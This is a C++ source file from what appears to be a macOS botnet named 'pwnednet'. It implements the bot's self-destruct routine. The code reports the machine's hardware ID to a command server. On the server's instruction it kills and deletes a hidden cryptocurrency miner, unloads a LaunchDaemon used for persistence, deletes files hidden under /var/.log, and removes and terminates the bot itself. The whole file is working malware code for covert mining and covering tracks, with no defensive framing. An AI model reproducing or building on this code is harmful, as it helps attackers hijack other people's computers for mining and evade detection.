//
//  Kill.cpp
//  pwnednet
//
/*
 TODO :
 * If the bot hasnt been connected to the internet
 * for x amount of time then kill the bot
 
 
 
 SUMMARY :
 - Asks the server if we should kill
 - Send the hwid to the server then remove the bot from the database
 - If the bot is removed from the database then continue
 - Remove the bot file

*/

#include "include.h"

void RemoveMiner();
void RemoveFromStartup();



void Bot::Kill() {
    
    string cmd;
    string listento = g_Commands + "kill.php?execute";
    string pData    = "hwid=" + bot->hwid;
    string pKill    = con->post(listento.c_str(), pData.c_str());
    
    
    if(pKill != "continue")
        return;
    

    // Remove files

    RemoveMiner();

    
    sleep(1);
    
    
    RemoveFromStartup();
    
    
    sleep(1);
    
    
    // remove the bot
    char path[2048];
    realpath(BotName.c_str(), path);
    
    remove(path);           // Remove the bot file
    remove(cstr("/var/.log/"));    // Remove .log
    
    
    sleep(5);
    
    
    // kill process
    
    KillProcess(BotName);
    
    
    
}


void RemoveMiner() {
    
    string cmd;
    string minerpath    = fPrivate + "/" + minerMain + "/" + fAssets + "/" + szMinerName;
    string frameworkpath= fPrivate + "/" + minerMain + "/" + fAssets + "/" + "Frameworks";
    string assetspath   = fPrivate + "/" + minerMain + "/" + fAssets + "/";
    string trashpath    = fPrivate + "/" + minerMain + "/";
    
    if(IsMining()) { // If the miner is mining then kill it
        
        cmd = "killall " + szMinerName;
        system(cmd.c_str());
        
    }
    
    // Now remove the files
    
    if(DoesFileExist(minerpath)) {
        remove(cstr(minerpath));
    }
    
    if(DoesFileExist(frameworkpath)) {
        system(cstr("sudo rm -R " + frameworkpath));
    }
    
    if(DoesFileExist(assetspath)) {
        remove(cstr(assetspath));
    }
    
    if(DoesFileExist(trashpath)) {
        remove(cstr(trashpath));
    }
    
    
}

void RemoveFromStartup() {

    string plistName    = "";
    string DaemonName   = "";

    // If the plist exsits
    while(DoesFileExist(cstr("/Library/LaunchDaemons/" + plistName)))
    {
        system(cstr("sudo launchctl unload /Library/LaunchDaemons/" + plistName));
        remove(cstr("/Library/LaunchDaemons/" + plistName));
        sleep(1);
    }
    
    // If the daemon exists
    while(DoesFileExist(cstr("/var/.log/" + DaemonName)))
    {
        remove(cstr("/var/.log/" + DaemonName));
        sleep(1);
    }
    
    
    
}



















